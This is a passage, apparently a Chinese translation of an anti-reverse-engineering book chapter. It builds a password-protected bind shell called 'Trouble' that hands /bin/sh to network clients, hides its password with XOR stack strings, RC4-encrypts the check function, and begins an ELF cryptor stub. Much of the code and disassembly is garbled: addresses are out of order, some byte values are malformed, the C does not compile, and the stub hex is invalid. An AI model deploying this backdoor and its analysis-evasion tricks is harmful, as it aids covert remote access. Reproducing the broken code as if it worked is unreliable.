.text:00000000000400D0 jnz     short loc_404D2
.text:00000000000400D1 add    retn    rsp, 38h
------------------------------------------------
.text:00000000000400D2 ; ; CODE XREF:check_password
.text:00000000000400D2
.text:00000000000400D2 loc_404D2:
.text:00000000000400D2+DB j
.text:00000000000000D2 call __stack_chk_fail
.text:00000000000000D2 check_password endp
```

每个字符的十六进制表示在反汇编中都是可见的，因此反向工程人员无法直接从反汇编中读取值。每次都将它们写成数组是不现实的；让我们使用宏来自动化这一过程。宏到底是什么？GCC的文档将其称为“一个被赋予了名称的代码片段”。对于我们的目的，你可以将宏视为一种将其替换为宏中定义的实际代码的简单机制。请理解这是一种过度简化，但对于理解基础已经足够。

```c
/**
* 下面的宏可以用于生成由给定“密钥”混淆过的栈上字符串。宏从 0 到 31 列出。
* 字符串的长度是宏名称中的数字。例如，如果
* 我有一个 8 字节的字符串想要混淆，我将使用 XOR_STRING7。
* 因为宏从...开始。
*/
```

```c
#define XOR_STRING0(storage, string) storage[0] = string[0] ^ key;
#define XOR_STRING1(storage, string) storage[1] = string[1] ^ key;
#define XOR_STRING2(storage, string) storage[2] = string[2] ^ key;
#define XOR_STRING3(storage, string) storage[3] = string[3] ^ key;
#define XOR_STRING4(storage, string) storage[4] = string[4] ^ key;
#define XOR_STRING5(storage, string) storage[5] = string[5] ^ key;
#define XOR_STRING6(storage, string) storage[6] = string[6] ^ key;
#define XOR_STRING7(storage, string) storage[7] = string[7] ^ key;
#define XOR_STRING8(storage, string) storage[8] = string[8] ^ key;
#define XOR_STRING9(storage, string) storage[9] = string[9] ^ key;
#define XOR_STRING10(storage, string) storage[10] = string[10] ^ key;
#define XOR_STRING11(storage, string) storage[11] = string[11] ^ key;
#define XOR_STRING12(storage, string) storage[12] = string[12] ^ key;
#define XOR_STRING13(storage, string) storage[13] = string[13] ^ key;
#define XOR_STRING14(storage, string) storage[14] = string[14] ^ key;
#define XOR_STRING15(storage, string) storage[15] = string[15] ^ key;
#define XOR_STRING16(storage, string) storage[16] = string[16] ^ key;
#define XOR_STRING17(storage, string) storage[17] = string[17] ^ key;
```

```c
XOR_STRING26(storage, string, key);
#define XOR_STRING28(storage, string, key) storage[28] = string[28] ^ key; \
XOR_STRING27(storage, string, key);
#define XOR_STRING29(storage, string, key) storage[29] = string[29] ^ key \
XOR_STRING28(storage, string, key);
#define XOR_STRING30(storage, string, key) storage[30] = string[30] ^ key \
XOR_STRING29(storage, string, key);
#define XOR_STRING31(storage, string, key) storage[31] = string[31] ^ key \
XOR_STRING30(storage, string, key);
```

```c
/** 此函数用于去混淆字符串。它不是一个宏，是因为我们
 * 不在编译时执行。我们希望在运行时执行。
 *
 * @param[in,out] p_string 要去混淆的字符串
 * @param[in] p_length 字符串的长度
 * @param[in] p_key 用于去混淆的“密钥”
 *
 * @note p_string 将被去混淆。因此，如果你第二次调用此函数
 * 并传入 p_string，那么它会被重新混淆。
 */
```

```c
char* undo_xor_string(char* string, int length, char key)
{
    for (int i = 0; i < length; i++)
    {
        string[i] = string[i] ^ key;
    }
    return string;
}
```

我确定你一定在想：“天哪，这可真太丑了。我们不能直接用`for`循环吗？也许可以像这样：

```c
#define XOR_FOR_REAL(storage, string, size, key) \
for (int i = 0; i < size; i++) {
    storage[i] = string[i] ^ key; \
}
```

遗憾，不行。请记住，宏本质上是定义代码片段的占位符。调用`XOR_STRING31`将导致32行代码替换“XOR-STRING31”。而`XOR_FOR_REAL`只会产生三行替换代码。`for`循环无法可靠地生成栈上字符串（即“栈上字符串”会出现在字符串输出中）。因此，我们只能被迫使用这种“多宏”的方案。

现在你可以重写`check_password()`来使用其中一个`XOR_STRING`宏了。

使用XOR混淆栈上字符串修改`check_password()`：

```c
#include xor_string.h

bool check_password(const char* p_password)
{
    char pass[password_size] = {};
    XOR_STRING31(pass, password, 0xaa);

    // 验证密码
    return memcmp(undo_xor_string(pass, 32, 0xaa), p_password, 32) != 0;
}
```

现在密码在反汇编代码中看起来没有那么明显了。

`check_password()`中XOR混淆栈字符串的反汇编：

| .text:00000000000040E0 check_password | ; CODE XREF:main+13C p |
| :--- | :--- |
| .text:00000000000040E0 | \| sub rsp, 38h \| |
| .text:00000000000040E8 | \| mov rsi, rdi \| |
| .text:00000000000040E4 | \| mov edx, 20h \| |
| .text:00000000000040E7 | \| mov rax, fs:28h \| |
| .text:00000000000040EC | \| mov [rsp+38h-var_10], rax \| |
| .text:00000000000040F5 | \| xor eax, eax \| |
| .text:00000000000040FA | \| mov [rsp+38h-var_18], 0 \| |
| .text:00000000000040FC | \| mov [rsp+38h-28+0F], 0Fh \| |
| .text:0000000000004091 | \| mov rdi, rsp \| |
| .text:0000000000004099 | \| mov [rsp+38h-var_28+Eh], 0Bh \| |
| .text:000000000000409E | \| mov [rsp+38h-var_28+Dh], 0F2h \| |
| .text:0000000000004093 | \| mov [rsp+38h-var_28+Ch], 0C4h \| |
| .text:0000000000004098 | \| mov [rsp+38h-var_28+Bh], 0E6h \| |
| .text:000000000000409D | \| mov [rsp+38h-var_28+Ah], 0E7h \| |
| .text:0000000000004092 | \| mov [rsp+38h-var_28+9], 0C3h \| 注意我在这里用词很小心，因为理论上循环可能会被优化器展开并生成栈字符串，这是不可靠的，且我不确定是否 |
| .text:0000000000004027 | \| mov [rsp+38h+var_28], @E7h \| |
| .text:000000000000402C | \| mov [rsp+38h+var_27], @FBh \| |
| .text:0000000000004031 | \| mov [rsp+38h+var_26], @E0h \| |
| .text:0000000000004036 | \| mov [rsp+38h+var_25], @C5h \| |
| .text:000000000000403B | \| mov [rsp+38h+var_24], @D5h \| |
| .text:0000000000004040 | \| mov [rsp+38h+var_23], @92h \| |
| .text:0000000000004045 | \| mov [rsp+38h+var_22], @F8h \| |



# 第4章：对抗字符串分析

## 反汇编代码片段

以下是 `check_password()` 函数的反汇编代码，展示了其内部逻辑：

```
| .text:000000000000404A | | mov [rsp+38h+var_21], @09h |
| .text:000000000000404F | | mov [rsp+38h+var_20], @E6h |
| .text:0000000000004054 | | mov [rsp+38h+var_1F], @E3h |
| .text:0000000000004059 | | mov [rsp+38h+var_18], @0Dh |
| .text:000000000000405E | | mov [rsp+38h+var_17], @99h |
| .text:0000000000004063 | | mov [rsp+38h+var_16], @08h |
| .text:0000000000004068 | | mov [rsp+38h+var_15], @FBh |
| .text:000000000000406D | | mov [rsp+38h+var_14], @E9h |
| .text:0000000000004072 | | mov [rsp+38h+var_13], @09h |
| .text:0000000000004077 | | mov [rsp+38h+var_12], @F8h |
| .text:000000000000407C | | mov [rsp+38h+var_11], @09h |
| .text:0000000000004081 | | mov [rsp+38h+var_10], @E8h |
| .text:0000000000004086 | | mov [rsp+38h+var_09], @D2h |
| .text:000000000000408B | | mov [rsp+38h+var_08], @C4h |
| .text:0000000000004090 | | mov [rsp+38h+var_07], @E8h |
| .text:0000000000004095 | | mov [rsp+38h+var_06], @E2h |
| .text:000000000000409A | | mov [rsp+38h+var_05], @E7h |
| .text:000000000000409F | | movd xmm, cs:cmword_401A0 |
| .text:00000000000040A3 | | mov xmm, [rsp+38h+var_38] |
| .text:00000000000040AB | | xor xmm, xmm |
| .text:00000000000040B0 | | pxor xmm, [rsp+38h+var_28] |
| .text:00000000000040B4 | | movaps [rsp+38h+var_38], xmm |
| .text:00000000000040BE | | movaps [rsp+38h+var_28], xmm0 |
| .text:00000000000040C3 | | call memcmp |
| .text:00000000000040C8 | | test eax, eax |
| .text:00000000000040CA | | setnz al |
| .text:00000000000040CD | | mov rcx, [rsp+38h+var_10] |
| .text:00000000000040D2 | | xor rcx, fs:28h |
| .text:00000000000040DB | | jnz short loc_4009E2 |
| .text:00000000000040DD | | add rsp, 38h |
| .text:00000000000040E1 | | retn |
```

## 将 `check_password()` 放入独立段

`chap_4_static_analysis/dontpanic/trouble/trouble_layout.lds` 链接器脚本定义了 `.check_password` 段：

```ld
SECTIONS
{
    check_password_size = SIZEEOF(.check_password);
}
```

但存在一个问题。目前，`check_password()` 位于 `.text` 段中。你需要修改函数定义，使其被放置在自己的段中。这可以通过 GCC 的函数属性功能⁴³ 实现。将 `check_password()` 的函数定义更新为如下所示：

在 `check_password()` 上使用 `section` 命名属性

```c
bool __attribute__((section(".check_password"))) check_password(const char* p_password)
{
    char pass[password_size] = {};
    XOR_STRING31(pass, password, 0xaa);

    // 验证密码
    return memcmp(undo_xor_string(pass, 32, 0xaa), p_password, 32) != 0;
}
```

如果你重新编译 Trouble 且不剥离（strip）段表，你可以确认创建了一个特殊的 `.check_password` 段。

> ⁴https://gcc.gnu.org/onlinedocs/gcc/Common-Function-Attributes.html#Common-Function-Attributes

## 验证 `.check_password` 段

使用 `readelf` 查看段表：

`albino-lobster@ubuntu:~/antire_book/chap_4_static_analysis/dontpanic/build$ readelf -S .trouble/trouble`

有 13 个头头部，从偏移量 0x31c8 开始：

段头：

| [Nr] | 名称 | 类型 | 地址偏移 | 链接 | 信息 | 对齐 |
|---|---|---|---|---|---|---|
| [0] | | NULL | 0000000000000000 0000000000000000 | 0 | 0 | 00000000 |
| [1] | .init | PROBITS | 0000000000000000 0000000000401220 | 0 | 0 | 00000120 |
| [2] | .text | PROBITS | 0000000000000000 0000000000401330 | AX | 0 | 000001330 |
| [3] | .check_password | PROBITS | 0000000000000000 0000000000401870 | AX | 0 | 000001870 |
| [4] | .fini | PROBITS | 0000000000000000 0000000000401977 | AX | 0 | 000001977 |
| [5] | .rodata | PROBITS | 0000000000000000 0000000000401980 | WA | 0 | 000001980 |
| [6] | .eh_frame | PROBITS | 0000000000000000 00000000004021d8 | A | 0 | 000021d8 |
| [7] | .init_array | INIT_ARRAY | 0000000000000000 0000000000602fe8 | WA | 0 | 00002fe8 |
| [8] | .fini_array | FINI_ARRAY | 0000000000000000 0000000000602ff0 | WA | 0 | 00002ff0 |
| [9] | .jcr | PROBITS | 0000000000000000 0000000000602ff8 | WA | 0 | 00002ff8 |
| [10] | .data | PROBITS | 0000000000000000 0000000000603000 | WA | 0 | 00003000 |
| [11] | .bss | NOBITS | 0000000000000000 0000000000603180 | WA | 0 | 00003160 |
| [12] | .shhtrap | STRTAB | 0000000000000000 0000000000000000 | | 0 | 00003160 |

标志说明：

W (write), A (alloc), X (execute), M (merge), S (strings), l (large), I (info), L (link order), G (group), T (TLS), E (exclude), x (unknown), N (extra OS specific), p (processor specific)

太棒了！现在你需要为 `password_size` 添加一个定义，以便 Trouble 在运行时知道 `check_password()` 函数的大小。你可以在 `check_password` 函数上方添加此行：

```c
extern void* password_size;
```

如果你重新编译并在符号表中查找 `password_size`，你将找不到它。这是因为你还没有向链接器脚本添加逻辑。遗憾的是，这是 CMake 失败的少数几个地方之一。在 CMake 中没有方法可以实际上向链接器传递脚本。我被迫使用了黑客手段。Trouble 的 `CMakeLists.txt` 应该更新为如下所示：

使用 `sed` 将链接器脚本插入 CMake

```cmake
project(trouble)
minimum_required(VERSION 3.0)

# 这将为 shell 创建一个 32 字节的“password”。此命令
# 仅在运行 "cmake" 时执行，因此如果你想生成新密码
# 应该从命令行运行 `cmake ..`。
set(random_password $(head /dev/urandom | tr -dc a-zA-Z0-9 | head -c 32))

# 这将在编译时将随机密码传递给 PROJECT_NAME
add_definitions(-Dpassword_size=${random_password}")

# 在构建完成后，显示随机密码
add_custom_command(TARGET ${PROJECT_NAME} POST_BUILD
    COMMAND sed -i 's,password_size,password_size,g' ${CMAKE_CURRENT_SOURCE_DIR}/trouble_layout.lds
    COMMAND echo "The random password is: ${random_password}")
```

## 使用 RC4 加密

`chap_4_static_analysis/dontpanic/trouble/rc4.c` 文件内容如下：

```c
/*
 * rc4.c
 *
 * Copyright (c) 1996-2000 Whistle Communications, Inc.
 * All rights reserved.
 *
 * 在遵循以下义务和免责声明的前提下，Whistle Communications 
 * 许可以源代码或目标代码形式（无论是否修改）对本软件 
 * 进行使用和重新分发；但必须满足以下条件：
 * 1. 源代码或目标代码的任何及所有复制品都必须包含上述
 * 版权声明以及下述的免责声明；且
 * 2. 不以任何方式或形式授予权利使用 Whistle 
 * Communications, Inc. 的商标，包括在广告、背书或其他地方
 * 使用 "WHISTLE COMMUNICATIONS" 标记，除非上述版权声明中
 * 或软件中已出现。
 *
 * 本软件由 WHISTLE COMMUNICATIONS “按原样”提供，且
 * 在法律允许的最大范围内，WHISTLE COMMUNICATIONS 对本软件不
 * 作任何明示或暗示的保证，包括但不限于对商品性、
 * 特殊用途的适用性或不侵权的所有暗示保证。
 * WHISTLE COMMUNICATIONS 不对本软件的使用或其使用
 * 结果的正确性、准确性、可靠性或其他方面不作任何 
 * 保证、担保或发表任何陈述。
 * 在任何情况下，WHISTLE COMMUNICATIONS 对因使用本软件
 * 引起的任何损害均不承担责任，包括但不
 * 限于任何直接、间接、附带、特殊、示例、
 * 惩罚性或后果性的损害、购买替代商品或
 * 服务、使用、数据或利润的损失，无论其如何引起以及
 * 在任何何种责任理论下（无论是合同、严格责任还是
 * 侵权（包括过失或其他），因使用本软件以任何方式
 * 产生的，即使 WHISTLE 已被告知可能发生
 * 此损害。
 *
 * $FreeBSD; src/crypto/rc4/rc4.c,v 1.2.2.1 2000/04/18 04:48:31 archie Exp $
 */

#include "rc4.h"
#include <sys/types.h>
```

```c
static __inline void
swap_bytes(uint8_t *a, uint8_t *b)
{
    uint8_t temp;

    temp = *a;
    *a = *b;
    *b = temp;
}
```

```c
/*
 * 使用提供的密钥初始化 RC4 状态缓冲区，
 * 密钥可以具有任意长度。
 */
void
rc4_init(struct rc4_state *const state, const uint8_t *key, int keyelen)
{
    uint8_t j;
    int i;

    /* 使用单位置换初始化状态 */
    for (i = 0; i < 256; i++)
        state->perm[i] = (uint8_t)i;
    state->index1 = 0;
    state->index2 = 0;

    /* 使用密钥数据随机化置换 */
    for (i = 0; i < 256; i++) {
        j += state->perm[i] + key[i % keyelen];
        swap_bytes(&state->perm[i], &state->perm[j]);
    }
}
```

```c
/*
 * 使用提供的 RC4 状态缓冲区加密数据。
 * 输入和输出缓冲区可以是同一个缓冲区。
 * 由于 RC4 是一种流密码，该函数同时用于
 * 加密和解密。
 */
void
rc4_crypt(struct rc4_state *const state,
           const uint8_t *inbuf, uint8_t *outbuf, int bufflen)
{
    int i;
    uint8_t j;

    for (i = 0; i < bufflen; i++) {
        /* 更新索引 */
        state->index1++;
        state->index2 += state->perm[index1];

        /* 修改置换 */
        swap_bytes(&state->perm[index1],
                   &state->perm[index2]);

        /* 加密/解密字节 */
        j = state->perm[index1] + state->perm[index2];
        outbuf[i] = inbuf[i] ^ state->perm[j];
    }
}
```

你需要更新 Trouble 的 `CMakeLists.txt` 以包含 `rc4`：

```cmake
add_executable(${PROJECT_NAME} trouble.c rc4.c)
```

接下来你需要更新 `trouble.c` 在 `check_password()` 中使用 RC4 解密。这里是使用 RC4 解密更新后的 `trouble.c`：



```c
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include <stdbool.h>
#include <sys/man.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include "rc4.h"
#include "xor_string.h"

extern size_t password_size;
unsigned char check_password_key[128] __attribute__((section(".rc4_check_password"))) = {0};

bool __attribute__((section(".check_password"))) check_password(const char* password)
{
    char pass[password_size] = {};
    // 验证密码
    return memcmp(xor_string(pass, password, 32) != 0;
}

/* 实现了一个简单的 bind shell。服务器在允许访问 shell 之前需要密码。服务器每次运行时都会随机生成。它将一直运行直到被杀死。 */
int main(int argc, char* argv[])
{
    int sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (sock == -1) {
        fprintf(stderr, "Failed to create the socket.\n");
        return EXIT_FAILURE;
    }

    struct sockaddr_in bind_addr = {};
    bind_addr.sin_family = AF_INET;
    bind_addr.sin_addr = htonl(INADDR_ANY);
    bind_addr.sin_port = htons(12345);

    int bind_result = bind(sock, (struct sockaddr*)&bind_addr, sizeof(bind_addr));
    if (bind_result != 0) {
        perror("Bind call failed");
        return EXIT_FAILURE;
    }

    int listen_result = listen(sock, 5);
    if (listen_result != 0) {
        perror("Listen call failed");
        return EXIT_FAILURE;
    }

    while (true) {
        int client_sock = accept(sock, NULL, NULL);
        if (client_sock < 0) {
            perror("Accept call failed");
            return EXIT_FAILURE;
        }
        int child_pid = fork();
        if (child_pid == 0) {
            // 读取密码
            char password_input[password_size] = {};
            int read_result = read(client_sock, password_input, password_size - 1);
            if (read_result < (int)(password_size - 1)) {
                close(client_sock);
                return EXIT_FAILURE;
            }
            // 解密有效目标
            struct rc4_state state = {};
            mprotect(check_password, (uint64_t)&password_size, PROT_READ | PROT_WRITE | EXEC);
            rc4_init(&state, check_password_key, sizeof(check_password_key));
            rc4_crypt(&state, (unsigned char*)check_password, (unsigned char*)check_password, (uint64_t)&password_size);
            mprotect(check_password, (uint64_t)&password_size, PROT_READ | PROT_WRITE | EXEC);

            if (check_password(password_input)) {
                close(client_sock);
                return EXIT_FAILURE;
            }

            dup2(client_sock, 0);
            dup2(client_sock, 1);
            dup2(client_sock, 2);

            char* empty[] = { NULL };
            char binish[] = { '/', 'b', 'i', 'n', '/', 's', 'h', 0 };
            execve(binish, empty, empty);
            close(client_sock);
            return EXIT_SUCCESS;
        }
        close(client_sock);
    }
}
```

Trouble 中巨大的变化是在执行 `check_password()` 之前对其进行解密。此外，请注意声明了另一个段：

```c
unsigned char check_password_key[128] __attribute__((section(".rc4_check_password"))) = { 0 };
```

该段将包含加密 `check_password()` 时使用的密钥。

# 第4章：对抗字符串分析

* `@param[in,out] p_data` ELF 二进制文件
* `@return` 成功返回 `true`，否则返回 `false`

```cpp
bool encrypt_functions(std::string& p_data) {
    if (p_data[0] != 0x7f || p_data[1] != 'E' || p_data[2] != 'L' || p_data[3] != 'F') {
        return false;
    }

    El64Ehdr* ehdr = reinterpret_cast<El64Ehdr*>(&p_data[0]);
    El64Shdr* sections = reinterpret_cast<El64Shdr*>(p_data[ehdr->sh_off]);
    El64_Half sections_count = ehdr->sh_nnum;
    El64Shdr* strings_header = reinterpret_cast<El64Shdr*>(p_data[ehdr->sh_off] +
        (ehdr->sh_size) * ehdr->shstrndx);
    const char* strings_table = &p_data[strings_header->sh_offset];

    std::map<std::string, El64Addr> encrypt_mappings;

    // 找到所有 ".rc4" 
    El64Shdr* current = sections;
    for (int i = 0; i < sections_count; i++, current++) {
        std::string section_name(&strings_table[current->sh_name]);
        if (section_name.find(".rc4") == 0) {
            // 存储节的其他名称以便查找加密
            std::string func_name = "." + section_name.substr(5);
            encrypt_mappings[func_name] = current->sh_offset;
        }
    }

    // 找到所有引用 ".rc4_" 进行加密的节
    current = sections;
    std::random_device rd;
    std::uniform_int_distribution<int> dist(0, 255);
    for (int i = 0; i < sections_count; i++, current++) {
        std::string section_name(&strings_table[current->sh_name]);
        if (encrypt_mappings.find(section_name) != encrypt_mappings.end()) {
```

```cpp
// 随机生成一个密钥用于加密
unsigned char key[128] = { 0 };
for (std::size_t i = 0; i < sizeof(key); i++) {
    key[i] = dist(rd);
}
```

```cpp
// 加密该节
struct rc4_state state = {};
rc4_init(&state, sizeof(key));
rc4_crypt(&state, reinterpret_cast<unsigned char*>(&p_data[current->sh_offset]),
          reinterpret_cast<unsigned char*>(&p_data[current->sh_offset]),
          current->sh_size);
memcpy(&p_data[encrypt_mappings[section_name]], key, sizeof(key));
std::cout << "[+] Encrypted 0x" << std::hex << current->sh_offset << std::endl;
```

```cpp
return true;
}

int main(int p_argc, char** p_argv) {
    if (p_argc != 2) {
        std::cerr << "Usage: ./encryptFunctions file path" << std::endl;
        return EXIT_FAILURE;
    }

    std::ifstream inputFile(p_argv[1], std::ifstream::in | std::ifstream::binary);
    if (!inputFile.is_open() || !inputFile.good()) {
        std::cerr << "Failed to open the provided file: " << p_argv[1] << std::endl;
        return EXIT_FAILURE;
    }

    std::string input((std::istreambuf_iterator<char>(inputFile), std::istreambuf_iterator<char>());
    inputFile.close();

    if (!encrypt_functions(input)) {
        std::cerr << "Failed to complete the encryption" << std::endl;
        return EXIT_FAILURE;
    }

    std::ofstream outputFile(p_argv[1], std::ofstream::binary);
    if (!outputFile.is_open() || !outputFile.good()) {
        std::cerr << "Failed to open the provided file: " << p_argv[1] << std::endl;
        return EXIT_FAILURE;
    }

    outputFile.write(input.data(), input.length());
    outputFile.close();

    return EXIT_SUCCESS;
}
```

# 第4章：对抗字符串分析

为了使用 `encryptFunctions`，你需要更新 "dontpanic" 目录下的 `CMakeLists.txt`。它应该像这样：

### Dont Panic 的 CMake.txt

```cmake
project(dontpanic)
cmake_minimum_required(VERSION 3.0)

add_subdirectory(encryptFunctions)
add_subdirectory(trouble)
```

更新 Trouble 的 CMake.txt 以包含 `encryptFunctions` 的执行：

### Updating Trouble 的 CMake.txt

```cmake
project(trouble)
cmake_minimum_required(VERSION 3.0)

# 此命令为 bind shell 创建32字节的"password"。只有在运行 "cmake" 时运行，如果你想生成新密码，应运行 "cmake ..; make"
execute_process(COMMAND /bin/sh
    ARGS -c 'cat /dev/urandom | tr -dc a-zA-Z0-9 | head -c 32'
    OUTPUT random_password)

### 将随机密码作为宏传递给 ${PROJECT_NAME}
add_definitions(-Dpassword="${random_password}" -Dpassword_size=32)

set(CMAKE_C_COMPILER "gcc")
set(CMAKE_C_FLAGS "-Wall -Wextra -Wshadow -O3 -static -std=gnu11")
add_executable(${PROJECT_NAME} src/trouble.c src/rc4.c)

add_custom_target(addLDS
    COMMAND sed -i 's,-o,${CMAKE_CURRENT_SOURCE_DIR}/trouble. -g' ./CMakeFiles/trouble.dir/link.txt)
add_dependencies(${PROJECT_NAME} addLDS)

# 构建完成后，向用户显示随机密码
add_custom_command(TARGET ${PROJECT_NAME} POST_BUILD
    COMMAND ${CMAKE_COMMAND} -E echo "The bind password is: ${random_password}")

add_custom_command(TARGET ${PROJECT_NAME} POST_BUILD
    COMMAND ../encryptFunctions ${CMAKE_CURRENT_BINARY_DIR}/${PROJECT_NAME})
```

最后，你可以编译 Trouble。应该会有与 `check_password()` 加密相关的额外输出。

# 第4章：对抗字符串分析

## 使用 encryptFunctions 重建 Trouble



```bash
albino-lobster@ubuntu:~/antire_book/chap_4_static_analysis/dontpanic/build$ make
-- Configuring done
-- Generating done
-- Build files have been written to /home/albino-lobster/antire_book/chap_4_static_analysis/dontpanic/build
[20%] Built target strip
[40%] Built target fakeHeaders
Scanning dependencies of encryptFunctions
[50%] Built CXX object encryptFunctions/CMakeFiles/encryptFunctions.dir/encryptFunctions.cpp.o
[70%] Linking CXX executable encryptFunctions
[70%] Built target encryptFunctions
[70%] Built target addLDS
Scanning dependencies of trouble
[80%] Built C object trouble/CMakeFiles/trouble.dir/src/trouble.c.o
[90%] Built C object trouble/CMakeFiles/trouble.dir/src/rc4.c.o
[100%] Linking C executable trouble
The bind password is: tS5MOag4uurRnW0Lxo4KCF9IR5V
+] Encrypted 0x2310
[100%] Built target trouble
```

现在到了有趣的部分。让我们看看反汇编器中`check_password()`的样子。

Radare2 中加密的`check_password()`

```bash
albino-lobster@ubuntu:~/antire_book/chap_4_static_analysis/dontpanic/build$ radare2 /trouble/trouble
Warning: Cannot initialize dynamic strings
-- Welcome to "IDA the roguelike"
[0x04003b0> aaa
[x] 分析所有以 sym. 和 entry@ 开头的标记 (aa)
[x] 分析指令引用的长度 (aa)
[x] 分析函数调用 (aac)
[ ] * 使用 -AA 或 aa 执行额外的实验性分析
[x] 为 fn.* 和 sym.func.* 函数构造函数 (aan)
[0x04003b0> pdf @ sym.check_password
;-- section..check_password
/ (fcn) sym.check_password 41
```

```assembly
sym.check_password();
      ; XREF from 0x000402f3 (unk)
      ; DATA XREF from 0x000402a0 (unk)
      ; DATA XREF from 0x000402c3 (unk)
      ; XREF from 0x000402e1
0x000000000040210 e6f6              out ecx
0x000000000040212 6c              insb [rdi]
0x000000000040213 f94              mov eax, esp
0x000000000040215 1596b2bb              mov [rsp+188h+var_168]
0x00000000004021a 38              mov [rdi],
0x00000000004021c 24              and eax, 6
0x00000000004021e b6d              mov dh, dx
0x00000000004021f 5d              pop rbp
0x000000000040220 b6ac              mov dh, eax
```

Radare2 生成了`check_password()`的反汇编，但它完全没用。对于仅仅隐藏字符串来说不错吧？加密函数具有会让运行时和内存分析变得困难的优势。我们将在后面的章节讨论。记住，加密函数并不意味着逆向工程师不会对其解密。以下反汇编显然没有符号，但你可以看到逆向工程师能够恢复所有的加密元素。

`check_password()`附近的反汇编

```assembly
.text:000000000004028F mov edx, 7
.text:0000000000040294 mov esi, 107h
.text:0000000000040299 rep stosq
.text:000000000004029C mov eax, ebp
.text:000000000004029E stosw
.text:00000000000402A0 mov edi, offset check_password
.text:00000000000402AA call mprotect
.text:0000000000040AA5 lea rdi, [rsp+188h+var_168]
.text:00000000000402AF mov edx, 80h
.text:00000000000402B4 mov esi, offset check_password_key
.text:00000000000402B9 call rc4_init
```

# 第 4 章：对抗字符串分析

```text
.text:000000000000402C mov edx, offset check_password
.text:000000000000402C8 lea rdi, [rsp+188h+var_168]
.text:000000000000402CD lea ecx, [rax]
.text:000000000000402CF mov rsi, rdx
.text:000000000000402D2 call rc4-crypt
.text:000000000000402D7 mov edx, 5
.text:000000000000402DC mov esi, 107h
.text:000000000000402E1 mov edx, offset check_password
.text:000000000000402E6 call mprotect
.text:000000000000402EB lea rdi, [rsp+188h+var_48]
.text:000000000000402F3 call check_password
```

## 创建加密器 (Cryptor)

正如你在上一章末尾看到的，进行静态分析的逆向工程师可以通过查看调用`check_password()`之前的反汇编代码，恢复解密该函数所需要的所有变量。这种事情可以阻止发生吗？答案总是否定的。你真的无法阻止它。但是，你可以让它变得困难。让我们写一个加密器来加密更多的二进制内容！

### 什么是加密器？

加密器对二进制文件进行加密，并添加额外的逻辑在运行时解密该二进制文件。几个开源示例是：

- 1. `cryptelf`⁴
- 2. `midgetpack`⁵

与加密器不同，壳程序（Packer）会压缩二进制文件。最广泛使用的加密器是`UPX` `upx`。

> ⁴ https://dl.packetstormsecurity.net/linux/cryptelf.c
> ⁵ https://github.com/arisada/midgetpack

### 实现加密器

为了保持简单，我写了一个只加密二进制文件代码的加密器。这意味着数据将保持未加密状态。此外，我使用的“加密算法”是字节异或（XOR）。这根本不是加密，而是一种混淆。我选择这些限制是为了让加密器及其添加到二进制文件中的汇编存根（Assembly Stub）尽可能简单。一旦你理解了这个简单加密器的工作原理，你就可以开始扩展它。

你可以在第四章的`cryptor`目录中找到代码。按照惯例，该项目包含两个文件：`CMakeLists.txt`和`cryptor.cpp`。

`chap_4_static_analysis/dontpanic/cryptor/CMakeLists.txt`

```cmake
project(cryptor CXX)
cmake_minimum_required(VERSION 3.0)

set(CMAKE_CXX_FLAGS "-Wall -Wextra -g")

add_executable(${PROJECT_NAME} src/cryptor.cpp)
```

`chap_4_static_analysis/dontpanic/cryptor/src/cryptor.cpp`

```cpp
#include <cstdlib>
#include <iostream>
#include <fstream>
#include <iomanip>
#include <cstring>
#include <elf.h>

/**
* 此工具实现了一个*非常*简单的加密器。“加密”方案是
* 单次异或运算。显然，这并不是你用来真正保护
* 二进制文件的工具，但它是开始理解加密器如何工作的一个有趣工具。
*
* 此工具只会“加密”PF_X 段。这意味着
* .data 是可见的。
*/

- 在 PF_X 段的末尾添加解密存根。重写入口地址，并从程序头之后到段结束处异或“加密”PF_X 段。
```

```cpp
/**

* @param[in,out] p_data 二进制文件

* @return 成功返回 true，否则返回 false

 */

bool add_crypt(std::string&, p_data)

{

    if (p_data[0] != 0x7f || p_data[1] != 'E' || p_data[2] != 'L' ||

        p_data[3] != 'F') {

        std::cerr << "- Bad magic" << std::endl;

        return 0;

    }

```

```cpp
Elf64_Ehdr* ehdr = reinterpret_cast<Elf64_Ehdr*>(&p_data[0]);

Elf64_Phdr* phdr = reinterpret_cast<Elf64_Phdr*>(&p_data[ehdr->e_off]);

int ph_entries = ehdr->e_num;

const Elf64_Phdr* segment = NULL;

for (int i = 0; i < ph_entries && segment == NULL; i++, phdr++) {

    if (phdr->p_type == PT_LOAD && phdr->flags & PF_X) {

        // 为了写入 PF_X 段，我们将设置标记。

        // 然而，更优雅的解决方案是使用 mprotect。

        phdr->p_flags |= PF_W;

        segment = phdr;

    }

}

if (segment == NULL) {

    std::cerr << "- Couldn't find an executable segment." << std::endl;

    return false;

}

```

// 不能加密 ELF 头或程序头，否则会破坏加载器。因此从程序头之后开始加密。
// 此逻辑假设 ELF 头和程序头位于段变量内。

```cpp
uint32_t encrypt_start = ehdr->e_off + (ph_entries * ehdr->p_size);

uint32_t virt_start = segment->p_addr + encrypt_start;

```

```cpp
// 存储真实的偏移量，用存根地址覆盖它。

uint32_t actual = ehdr->e_entry;

```

// 从技术上说，我们将存根写入程序头指定的范围之外。
// 但是！在现实世界中，地址将是页对齐的，
// 只要我们能将存根放在 PF_X 段结束和页面结束之间，就没有问题。
// 只更新段以包含存根的大小。
`ehdr->e_entry = segment->p_addr + segment->p_size;`

```cpp
unsigned char stub[] = {
	"48C375ED00" // mov rbp, virt_start
	"49C371BBAA0ABBCC" // mov r9, e_entry
	"49C370AA00000000" // xor [rbp+var_0], r8
	"44C14500" // mov r8, rax
	"44C8B84500" // mov r8, [rbp+var_0]
	"48FFCB" // inc rbp
	"4439CD" // cmp rbp, r9
	"7C7E9" // jl short loop
	"48C37519031h" // mov rbp, actual
	"FFE5" // jmp rbp
}; // 这是我们的解密逻辑。非常简单。
```

这是一个非常基本的检查，确保我们没有覆盖页面边界。

然而，请注意我使用的值（4096）对于*我的*系统是有效的。

4096 是非常常见的页面大小，但我们的情况可能会有所不同。

```cpp
int lower_bound = (encrypt_start + segment->p_size) % 4096;
int upper_bound = (encrypt_start + segment->p_size) + sizeof(stub) % 4096;
if (lower_bound > upper_bound)
{
    std::cerr << "- Stub cross page boundaries" << std::endl;
    return false;
}
```

```cpp
